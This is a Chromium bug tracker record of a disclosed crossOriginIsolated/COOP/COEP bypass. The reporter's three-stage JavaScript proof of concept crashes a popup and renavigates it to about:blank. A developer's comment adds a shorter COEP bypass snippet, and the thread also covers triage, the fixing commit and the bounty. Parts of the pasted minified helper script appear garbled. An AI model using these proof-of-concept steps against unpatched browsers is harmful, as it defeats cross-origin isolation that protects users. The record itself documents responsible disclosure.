# Security: crossOriginIsolated bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [40056434](https://issues.chromium.org/issues/40056434) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>COEP, Blink>SecurityFeature>COOP, Internals>Sandbox>SiteIsolation |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | nd...@protonmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2021-07-07 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

This makes "w" crossOriginIsolated with the COEP+COOP page but without the security limits.

**VERSION**  

Chrome Version: 91.0.4472.124 stable  

Operating System: Windows 10

**REPRODUCTION CASE**  

Note: Canary seems to have a browser crash when going to a invalid domain,  

While its crossOriginIsolated I dont know if this is because this issue is already known or just a bug.

// Please run the code on my domain <https://brick-faithful-healer.glitch.me/> or a domain you control.

async function stage1() {  

w = open("<https://invalid.local>");  

}

// 3rd party code that stops timer throttling.  

(function(s){var w,f={},o=window,l=console,m=Math,z='postMessage',x='HackTimer.js by turuslan: ',v='Initialisation failed',p=0,r='hasOwnProperty',y=[].slice,b=o.Worker;function d(){do{p=0x7FFFFFFF>p?p+1:0}while(fr);return p}if(!/MSIE 10/i.test(navigator.userAgent)){try{s=o.URL.createObjectURL(new Blob(["var f={},p=postMessage,r='hasOwnProperty';onmessage=function(e){var d=e.data,i=d.i,t=dr?d.t:0;switch(d.n){case'a':f[i]=setInterval(function(){p(i)},t);break;case'b':if(fr){clearInterval(f[i]);delete f[i]}break;case'c':f[i]=setTimeout(function(){p(i);if(fr)delete f[i]},t);break;case'd':if(fr){clearTimeout(f[i]);delete f[i]}break}}"]))}catch(e){}}if(typeof(b)!=='undefined'){try{w=new b(s);o.setInterval=function(c,t){var i=d();f[i]={c:c,p:y.call(arguments,2)};w[z](javascript:void(0););return i};o.clearInterval=function(i){if(fr)delete f[i],w[z](javascript:void(0);)};o.setTimeout=function(c,t){var i=d();f[i]={c:c,p:y.call(arguments,2),t:!0};w[z](javascript:void(0););return i};o.clearTimeout=function(i){if(fr)delete f[i],w[z](javascript:void(0);)};w.onmessage=function(e){var i=e.data,c,n;if(fr){n=f[i];c=n.c;if(nr)delete f[i]}if(typeof(c)=='string')try{c=new Function(c)}catch(k){l.log(x+'Error parsing callback code string: ',k)}if(typeof(c)=='function')c.apply(o,n.p)};w.onerror=function(e){l.log(e)};l.log(x+'Initialisation succeeded')}catch(e){l.log(x+v);l.error(e)}}else l.log(x+v+' - HTML5 Web Worker is not supported')})('HackTimerWorker.min.js');

// Stage 2 can be skipped if you use the chrome task manager to crash it.  

async function stage2() {  

checker = open();  

for (;;) {  

checker.location = "data:";  

await new Promise(resolve => setTimeout(resolve, 0));  

checker.location = "<https://invalid.local>";  

await new Promise(resolve => setTimeout(resolve, 100));  

}  

}

// Run this once invalid.local tab is crashed  

async function stage3() {  

checker.close();  

w.location = "data:html,foo";  

await new Promise(resolve => setTimeout(resolve, 100));  

w.location = "about:blank";  

}

**CREDIT INFORMATION**  

Reporter credit: NDevTK

## Attachments

- [bypass.mp4](attachments/bypass.mp4) (video/mp4, 9.9 MB)

## Timeline

### [Deleted User] (2021-07-07)

[Empty comment from Monorail migration]

### nd...@protonmail.com (2021-07-07)

This is the PoC video.

### dc...@chromium.org (2021-07-07)

[Empty comment from Monorail migration]

### dc...@chromium.org (2021-07-07)

[Empty comment from Monorail migration]

[Monorail components: Internals>Sandbox>SiteIsolation]

### cr...@chromium.org (2021-07-07)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature>COEP Blink>SecurityFeature>COOP]

### cr...@chromium.org (2021-07-08)

At first glance, this seems like a real bug allowing a COI page to load non-COI-compatible iframes, after navigating a popup to an invalid URL and crashing it.  I would guess that the opener window shouldn't be allowed to navigate the popup anymore after it leaves the browsing context group, but if that never happened due to the invalid URL, then the about:blank page in the popup should keep all the COI restrictions in place.

Hopefully someone working on COEP/COOP can help triage and confirm?

(As a side note, I managed to hit the crash from https://crbug.com/chromium/1068113 when trying to open an invalid URL from https://brick-faithful-healer.glitch.me/ on beta, but I can't seem to repro it now.)

### mk...@google.com (2021-07-08)

Tentatively assigning to ahemery@ for the COI bits, as he's been working through process questions over the last few quarters.

### nd...@protonmail.com (2021-07-08)

For me using setTimeout(resolve, 10) for stage 2 seems to result in a faster tab crash.
The reason crashing is done cross origin (invalid URL) is so that it does not crash the opener maybe theirs a easier way around this.
Strangely even when the tab gets closed the document still exists "{window: null, self: null, document: document, name: "", location: Location, …}"


### nd...@protonmail.com (2021-07-08)

The Issue seem to happen only after w.location = "data:html,foo";
Since there was a crash it behaviors differently, like the URL Spoof (https://bugs.chromium.org/p/chromium/issues/detail?id=1111646#c27)
Maybe for COOP a crashed tab should be detected as a different origin.



### ad...@google.com (2021-07-09)

ahemery@ please could you help to figure out a security severity, and also confirm that you can reproduce this on M91? (If so please set FoundIn-91)

### ah...@chromium.org (2021-07-12)

I can indeed reproduce in M91. On desktop that does not change anything currently since COI requirement for SAB and other APIs is planned for M92, but that's a high impact as soon as M92 is rolled out. Marking medium for now, and trying to figure out the root cause.

### ah...@chromium.org (2021-07-12)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-12)

[Empty comment from Monorail migration]

### ah...@chromium.org (2021-07-12)

Can also confirm I hit a browser crash on ToT when doing stage1(), specifically hitting this DCHECK:
https://source.chromium.org/chromium/chromium/src/+/main:content/browser/renderer_host/render_frame_host_manager.cc;l=1900

### [Deleted User] (2021-07-13)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ah...@chromium.org (2021-07-13)

Setting this back to available as I'm gonna be off starting tomorrow for a month, I didn't have time to investigate further.

### nd...@protonmail.com (2021-07-13)

I thought it was the same "provisional frames" issue as the URL spoof.
Its just a location change to "about:blank" instead since the origin is no longer inherited.
If it was also not possible to do location changes in that state that might fix it.
However I dont know the code so im just guessing.


### ad...@google.com (2021-07-14)

mkwst@, in ahemery@'s absence, would you assign to somebody else who can help?

### ar...@chromium.org (2021-07-14)

Me or Antonio will take a look during the fixit week.

### an...@chromium.org (2021-07-14)

I believe the situation here can improve if we force COOP: unsafe-none on error pages. Tentative CL here https://chromium-review.googlesource.com/c/chromium/src/+/3024337. I can't reproduce this behaviour with that CL, so that seems good.

### nd...@protonmail.com (2021-07-14)

[Comment Deleted]

### gi...@appspot.gserviceaccount.com (2021-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/09bb76a2c6bec417761b51a45ace93bea6b75986

commit 09bb76a2c6bec417761b51a45ace93bea6b75986
Author: Antonio Sartori <antoniosartori@chromium.org>
Date: Thu Jul 15 16:12:51 2021

Use COOP: unsafe-none for error pages

At the moment, error pages keep the Cross Origin Opener Policy of the
previous page (or of the last redirect response in case of a
redirect). This causes a number of bugs (see list attached).

There was a previous CL trying to address this:
https://crrev.com/c/2859165 by defaulting the error page to COOP:
unsafe-none. However, that was abandoned because it would have caused
the opener relationship to be severed in case a page with "COOP:
same-origin" opens a same-origin popup with the same COOP which ends
up in a network error and then reloads.

However, I think that is the expected behaviour no matter what.
Undependently of COOP, the error page will be cross-origin w.r.t. the
opener, so the opener relationship should be severed (but apparently
we were not doing that).

This CL defaults error pages to "COOP: unsafe-none" and runs the COOP
algorithms for error pages with their unique opaque origin. This
ensures that error pages are isolated, avoiding bugs as
https://crbug.com/1226909. Moreover, this should prevent the crash
https://crbug.com/1210622, since now process allocation and COOP
enforcement are computed with the same input, so they should give
consistent results. Finally, I believe this should also address
https://crbug.com/1205883.

Change-Id: Iede44839edb98586b3d51d345517f58efec10be7
Bug: 1226909,1210622,1205883
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3024337
Commit-Queue: Antonio Sartori <antoniosartori@chromium.org>
Commit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>
Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/heads/master@{#901982}

[modify] https://crrev.com/09bb76a2c6bec417761b51a45ace93bea6b75986/content/browser/cross_origin_opener_policy_browsertest.cc
[modify] https://crrev.com/09bb76a2c6bec417761b51a45ace93bea6b75986/content/browser/renderer_host/navigation_request.cc
[modify] https://crrev.com/09bb76a2c6bec417761b51a45ace93bea6b75986/content/browser/renderer_host/policy_container_navigation_bundle.cc


### an...@chromium.org (2021-07-16)

Closing as per https://crbug.com/chromium/1226909#c22.

### [Deleted User] (2021-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-16)

Requesting merge to beta M92 because latest trunk commit (901982) appears to be after beta branch point (885287).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-07-16)

This bug requires manual review: We are only 3 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), benmason@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ar...@chromium.org (2021-07-16)

Merging this toward M92 sounds extremely risky to me, especially 3 days before stable release. This patch needs some time to bake. I wouldn't be surprised to discover bugs in beta.

M93 branch cut was yesterday, stable release: August 31th isn't too far away. 

### nd...@protonmail.com (2021-07-16)

I agree the situation has improved for COOP and therefore crossOriginIsolated.
I dont think its "fixed" just because COOP prevents it.

Per https://bugs.chromium.org/p/chromium/issues/detail?id=1226909#c11 "that's a high impact as soon as M92 is rolled out"
it seems it get worse after the update however I understand its close to release.

### ar...@chromium.org (2021-07-16)

> Per https://bugs.chromium.org/p/chromium/issues/detail?id=1226909#c11 "that's a high impact as soon as M92 is rolled out"
> it seems it get worse after the update however I understand its close to release.

SharedArrayBuffer removal is still behind a reverse origin trial, and this is not going to end soon. Definitely not in M92. There are no strong difference in between M92-M93 outside of a 4 weeks delay.

### nd...@protonmail.com (2021-07-16)

Yeah because of the origin trial the SharedArrayBuffer part does not matter.

It seems the direct issue was never fixed I dont know why its closed.

### an...@chromium.org (2021-07-19)

My understanding of the bug is that we ended up having a crossOriginIsolated page without COOP and COEP set. The change from https://crbug.com/chromium/1226909#c22 prevents this: it's not possible to do this anymore following the procedure in the bug description.

ndevtk@protonmail.com can you clarify what you believe is still open? Maybe I am missing something?

### an...@chromium.org (2021-07-19)

I will drop Merge-Review-92 since I agree with https://crbug.com/chromium/1226909#c28.

### [Deleted User] (2021-07-19)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### nd...@protonmail.com (2021-07-20)

Your right it does fix what is described in the title, however without a COOP header COEP is not affected by this fix.
https://brick-faithful-healer.glitch.me/coep should not allow an embed on the opened window without corp.

### an...@chromium.org (2021-07-20)

If I understand correctly, you are suggesting to do the same flow on https://brick-faithful-healer.glitch.me/coep and check that at the end we have a popup without COEP.

This is actually much easier to do: on a COEP: require-corp page, do
w = window.open('https://www.example.org")
// after w navigates
w.location = "about:blank"

The popup has no COEP, the opener has COEP, and you have synchronous DOM access to the popup.

### nd...@protonmail.com (2021-07-20)

That is easier, I would have to find a better example.

### nd...@protonmail.com (2021-07-20)

The bot put back the target as 92,
If no issues are found could this be part of a security update instead of waiting 6 weeks for chrome 93?

### am...@google.com (2021-07-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-07-22)

Congratulations! The VRP Panel has decided to award you $3,000 for this report. A member of our finance team will be in touch soon to arrange payment. Thank you for your report! 

### nd...@protonmail.com (2021-07-22)

Thanks

### am...@google.com (2021-07-23)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-08-30)

[Empty comment from Monorail migration]

### am...@google.com (2021-08-31)

[Empty comment from Monorail migration]

### am...@google.com (2021-09-03)

[Empty comment from Monorail migration]

### as...@google.com (2021-09-08)

Marking as not applicable for M90 as introducing code is not in M90 (same as for https://crbug.com/1205883).

### [Deleted User] (2021-10-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1226909?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>SecurityFeature>COEP, Blink>SecurityFeature>COOP, Internals>Sandbox>SiteIsolation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056434)*
